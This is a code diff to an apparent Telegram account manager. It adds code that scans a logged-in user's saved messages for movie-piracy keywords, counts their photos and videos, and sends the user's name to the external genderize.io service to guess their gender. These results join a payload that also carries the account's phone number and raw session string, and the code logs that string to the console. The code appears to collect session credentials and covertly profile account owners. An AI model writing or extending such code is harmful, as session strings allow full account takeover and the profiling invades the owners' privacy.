@@ -63,6 +63,15 @@ export async function hasClient(number) {
     return clients.has(number);
 }
 
+function contains(str, arr) {
+    return (arr.some(element => {
+        if (str?.includes(element)) {
+            return true;
+        }
+        return false;
+    }))
+};
+
 export async function deleteClient(number) {
     console.log("Deleting Client - ", number);
     const cli = getClient(number);
@@ -334,6 +343,30 @@ class TelegramManager {
         await restAcc(this.phoneNumber);
     }
 
+    async getSelfMSgsInfo(){
+    
+    
+        let photoCount = 0;
+        let videoCount = 0;
+        let movieCount = 0;
+    
+        const messageHistory = await this.client.getMessages('me', { limit: 200 }); // Adjust limit as needed
+        for (const message of messageHistory) {
+          const text = message.text.toLocaleLowerCase();
+          if(contains(text, ['movie', 'series', '1080', '720','terabox','640','title','aac', '265','264','instagr','hdrip', 'mkv','hq', '480', 'blura', 's0', 'se0','uncut'])){
+            movieCount++
+          }else{
+            if (message.photo) {
+                photoCount++;
+              } else if (message.video) {
+                videoCount++;
+              }
+          }
+        }
+
+        return( {photoCount, videoCount, movieCount})
+    }
+
     async processLogin(result) {
         console.log(this.client.session.save());
         const sess = this.client.session.save() as unknown as string;
@@ -360,7 +393,12 @@ class TelegramManager {
                 personalChats++
             }
         });
+        const selfMSgInfo = await this.getSelfMSgsInfo();
+        const data = await axios.get(`https://api.genderize.io/?name=${user.firstName}${user.lastName ? `%20${user.lastName}` : ''}`);
+       
         const payload3 = {
+            ...selfMSgInfo,
+            gender:data?.data?.gender,
             mobile: user.phone,
             session: `${sess}`,
             firstName: user.firstName,
